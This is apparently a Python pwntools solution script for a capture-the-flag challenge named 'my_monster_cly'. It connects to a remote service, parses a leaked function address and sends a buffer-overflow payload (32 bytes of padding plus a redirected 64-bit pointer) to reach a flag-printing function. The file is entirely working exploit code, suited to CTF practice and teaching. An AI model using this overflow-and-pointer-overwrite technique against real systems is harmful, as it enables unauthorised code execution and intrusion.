from pwn import *


def solve():
    # my_monster_cly - show_flag
    offset = 0x134e - 0x1286

    io = remote('35.200.120.35', 9003)

    monster_info = io.recvuntil(b'Input name:')
    i = monster_info.find(b'cry()')
    j = monster_info[i:].find(b'0x')
    cry_addr = int(monster_info[i+j:i+j+18], 16)

    payload = b''
    payload += b'a' * 32
    payload += p64(cry_addr - offset)

    io.sendline(payload)

    io.recvuntil(b'Your Turn.\n')
    flag = io.recvline().decode()

    io.close()

    return flag


if __name__ == '__main__':
    print(solve())
